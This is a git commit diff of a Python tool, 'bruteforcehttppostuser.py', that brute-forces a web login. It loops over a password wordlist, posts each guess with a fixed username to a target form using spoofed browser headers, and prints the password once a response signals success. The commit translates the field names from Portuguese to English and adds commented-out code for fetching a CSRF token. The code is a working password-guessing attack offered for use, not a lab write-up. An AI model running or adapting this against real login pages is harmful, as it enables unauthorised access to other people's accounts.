9cf6401c44abb3d33d1135a3db6af59509f26524
Andre Milke <andremilke@gmail.com>
2019-02-27 08:57:18 -0300

    Update bruteforcehttppostuser.py

--- bruteforcehttppostuser.py
+++ bruteforcehttppostuser.py
@@ -13,7 +13,14 @@ class BruteForceService(object):
 
     def bruteForce(self):
         fpass = open(_listpass, encoding="utf8", errors='ignore')        
-    
+        #try:
+        #    with requests.Session() as s:
+        #        gettoken = s.get(_url,timeout = 3)
+                #gottoken = gettoken.content.split('name="token"')[1].split('"')[1]
+        #        print(gettoken.content)
+        #except requests.exceptions.RequestException as e:
+        #        print('exception caught', e)    
+
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0', 'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
                    'Content-Type': 'application/x-www-form-urlencoded',
@@ -22,10 +29,10 @@ class BruteForceService(object):
         start = datetime.datetime.now()
         for line in fpass:
             try:
-                senha = line.rstrip("\n")
-                print("Testando.. %s" % (senha))
+                passw = line.rstrip("\n")
+                print("Trying.. %s" % (passw))
                 with requests.Session() as s:
-                    _post_data = data = {'senha': senha,'usuario': _user}
+                    _post_data = data = {'password': passw,'login': _user}
                     _post_response = s.post(url=_url, data=_post_data,
                                             headers=headers)
                     result = _post_response.text
@@ -33,9 +40,9 @@ class BruteForceService(object):
                         end = datetime.datetime.now()
                         totaltime = end - start
                         time = int(totaltime.total_seconds() / 60)
-                        print("[+] Password founded %s" % (senha))
+                        print("[+] Password founded %s" % (passw))
                         print("[+} Duration (minutes): %s" % (time))
-                        print(result)
+                        #print(result)
                         break
                     _post_response.close()
             except requests.exceptions.RequestException as e:
